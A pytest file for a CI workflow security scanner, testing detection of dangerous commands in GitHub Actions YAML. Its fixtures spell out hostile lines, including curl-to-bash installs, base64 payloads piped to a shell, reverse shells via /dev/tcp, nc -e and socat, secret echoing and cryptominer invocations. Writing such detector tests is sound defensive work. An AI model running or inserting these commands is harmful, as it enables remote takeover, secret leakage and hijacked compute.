"""Tests for dangerous commands detector (PG-WF-008..011, 021..023)."""

from __future__ import annotations

from security.workflow.detectors.commands import detect
from security.workflow.models import ParseResult
from security.workflow.parser import parse_workflow_text
from security.workflow.rules import lookup


def test_empty_or_malformed_workflow_does_not_crash() -> None:
    """Empty or unparsed result must return an empty list without raising."""
    res_none = ParseResult(workflow=None, error="Failed to parse")
    assert detect(res_none) == []

    parsed_empty = parse_workflow_text("", path="dummy.yml")
    assert detect(parsed_empty) == []


def test_pg_wf_008_positive_curl_pipe_bash() -> None:
    """curl | bash and wget | sh patterns fire PG-WF-008."""
    yaml_text = """
name: Pipe Shell
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: Curl bash
        run: curl -sSL https://example.com/install.sh | bash
      - name: Wget sh
        run: wget -qO- https://example.com/setup | sh
"""
    result = parse_workflow_text(yaml_text, path="pipe.yml")
    findings = detect(result)
    wf_008 = [f for f in findings if f.rule_id == "PG-WF-008"]
    assert len(wf_008) == 2
    rule = lookup("PG-WF-008")
    assert rule.severity.value == "HIGH"


def test_pg_wf_008_negative_curl_without_pipe_to_shell() -> None:
    """curl or wget saving to a file without piping to shell does not fire."""
    yaml_text = """
name: Safe Curl
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sSL https://example.com/archive.tar.gz -o archive.tar.gz
      - run: wget https://example.com/file.txt
"""
    result = parse_workflow_text(yaml_text, path="safe_curl.yml")
    wf_008 = [f for f in detect(result) if f.rule_id == "PG-WF-008"]
    assert wf_008 == []


def test_pg_wf_008_evasion_multiline_and_other_shells() -> None:
    """Detect piping into zsh, fish, or across multiline blocks."""
    yaml_text = """
name: Shell Variants
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Starting install"
          curl https://example.com/script | zsh
      - run: wget http://example.com/init | fish
"""
    result = parse_workflow_text(yaml_text, path="shells.yml")
    findings = detect(result)
    wf_008 = [f for f in findings if f.rule_id == "PG-WF-008"]
    assert len(wf_008) == 2


def test_pg_wf_009_positive_base64_pipe_shell() -> None:
    """base64 -d | bash and echo ... | base64 -d | sh fire PG-WF-009."""
    yaml_text = """
name: Base64 Shell
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: base64 -d payload.b64 | bash
      - run: echo "aGVsbG8=" | base64 -d | sh
"""
    result = parse_workflow_text(yaml_text, path="b64.yml")
    findings = detect(result)
    wf_009 = [f for f in findings if f.rule_id == "PG-WF-009"]
    assert len(wf_009) == 2
    rule = lookup("PG-WF-009")
    assert rule.severity.value == "HIGH"


def test_pg_wf_009_negative_base64_decode_to_file() -> None:
    """base64 decoding to a file or stdout without piping to shell is safe."""
    yaml_text = """
name: Safe Base64
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: base64 -d certificate.b64 > cert.pem
"""
    result = parse_workflow_text(yaml_text, path="safe_b64.yml")
    wf_009 = [f for f in detect(result) if f.rule_id == "PG-WF-009"]
    assert wf_009 == []


def test_pg_wf_010_positive_eval_usage() -> None:
    """eval of variable or subshell command substitution fires PG-WF-010."""
    yaml_text = """
name: Eval Check
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: eval "$CMD"
      - run: eval $(cat script.sh)
      - run: eval `generate_code`
"""
    result = parse_workflow_text(yaml_text, path="eval.yml")
    findings = detect(result)
    wf_010 = [f for f in findings if f.rule_id == "PG-WF-010"]
    assert len(wf_010) == 3
    rule = lookup("PG-WF-010")
    assert rule.severity.value == "HIGH"


def test_pg_wf_010_negative_word_eval_in_harmless_context() -> None:
    """Occurrences of 'eval' in file names or harmless strings do not trigger."""
    yaml_text = """
name: Safe Eval Word
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: python evaluate_model.py --data test.csv
"""
    result = parse_workflow_text(yaml_text, path="safe_eval.yml")
    wf_010 = [f for f in detect(result) if f.rule_id == "PG-WF-010"]
    assert wf_010 == []


def test_pg_wf_011_positive_reverse_shell() -> None:
    """Reverse shell patterns (dev/tcp, nc -e, python socket, socat) fire PG-WF-011."""
    yaml_text = """
name: RevShell
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
      - run: nc -e /bin/bash 10.0.0.1 1337
      - run: python3 -c 'import socket; socket.connect(("10.0.0.1", 4444))'
      - run: socat TCP:10.0.0.1:4444 exec:sh
"""
    result = parse_workflow_text(yaml_text, path="revshell.yml")
    findings = detect(result)
    wf_011 = [f for f in findings if f.rule_id == "PG-WF-011"]
    assert len(wf_011) == 4
    rule = lookup("PG-WF-011")
    assert rule.severity.value == "CRITICAL"


def test_pg_wf_011_negative_harmless_nc() -> None:
    """Harmless netcat connectivity checks without -e sh do not trigger."""
    yaml_text = """
name: Safe Netcat
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: nc -z -v 127.0.0.1 8080
"""
    result = parse_workflow_text(yaml_text, path="safe_nc.yml")
    wf_011 = [f for f in detect(result) if f.rule_id == "PG-WF-011"]
    assert wf_011 == []


def test_pg_wf_021_positive_echo_secret_and_set_x() -> None:
    """Echoing secrets or using set -x with secrets in scope fires PG-WF-021."""
    yaml_text = """
name: Echo Secret
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.DEPLOY_KEY }}"
      - run: |
          set -x
          echo "Run build"
          echo "${{ secrets.TOKEN }}"
"""
    result = parse_workflow_text(yaml_text, path="echo_secret.yml")
    findings = detect(result)
    wf_021 = [f for f in findings if f.rule_id == "PG-WF-021"]
    assert len(wf_021) >= 2
    rule = lookup("PG-WF-021")
    assert rule.severity.value == "HIGH"


def test_pg_wf_021_negative_harmless_echo() -> None:
    """Echoing non-secret values does not fire PG-WF-021."""
    yaml_text = """
name: Safe Echo
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deployment in progress"
"""
    result = parse_workflow_text(yaml_text, path="safe_echo.yml")
    wf_021 = [f for f in detect(result) if f.rule_id == "PG-WF-021"]
    assert wf_021 == []


def test_pg_wf_022_positive_download_and_chmod() -> None:
    """Downloading a binary and running chmod +x in the same step fires PG-WF-022."""
    yaml_text = """
name: Chmod Exec
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -sSL https://example.com/binary -o binary
          chmod +x ./binary
          ./binary
"""
    result = parse_workflow_text(yaml_text, path="chmod.yml")
    findings = detect(result)
    wf_022 = [f for f in findings if f.rule_id == "PG-WF-022"]
    assert len(wf_022) == 1
    assert wf_022[0].rule_id == "PG-WF-022"
    rule = lookup("PG-WF-022")
    assert rule.severity.value == "MEDIUM"


def test_pg_wf_022_negative_local_chmod_without_download() -> None:
    """Running chmod +x on repository files without downloading does not fire PG-WF-022."""
    yaml_text = """
name: Local Chmod
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: chmod +x ./scripts/build.sh
"""
    result = parse_workflow_text(yaml_text, path="local_chmod.yml")
    wf_022 = [f for f in detect(result) if f.rule_id == "PG-WF-022"]
    assert wf_022 == []


def test_pg_wf_023_positive_miner_invocation() -> None:
    """Known cryptominer binaries (xmrig, cpuminer, minerd, ethminer) fire PG-WF-023."""
    yaml_text = """
name: Miner
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: ./xmrig --donate-level 1 -o pool.supportxmr.com:3333
      - run: cpuminer -a cryptonight -o stratum+tcp://pool:3333
"""
    result = parse_workflow_text(yaml_text, path="miner.yml")
    findings = detect(result)
    wf_023 = [f for f in findings if f.rule_id == "PG-WF-023"]
    assert len(wf_023) == 2
    rule = lookup("PG-WF-023")
    assert rule.severity.value == "CRITICAL"


def test_pg_wf_023_negative_legitimate_tools() -> None:
    """Standard build tools do not fire PG-WF-023."""
    yaml_text = """
name: Standard Build
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: cargo build --release
"""
    result = parse_workflow_text(yaml_text, path="cargo.yml")
    wf_023 = [f for f in detect(result) if f.rule_id == "PG-WF-023"]
    assert wf_023 == []


def test_commands_findings_deterministic_fingerprint() -> None:
    """Commands detector findings must produce deterministic fingerprints."""
    yaml_text = """
name: Deter Commands
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: eval "$CMD"
"""
    f1 = detect(parse_workflow_text(yaml_text, path="deter.yml"))
    f2 = detect(parse_workflow_text(yaml_text, path="deter.yml"))
    assert len(f1) == 1 and len(f2) == 1
    assert f1[0].fingerprint() == f2[0].fingerprint()
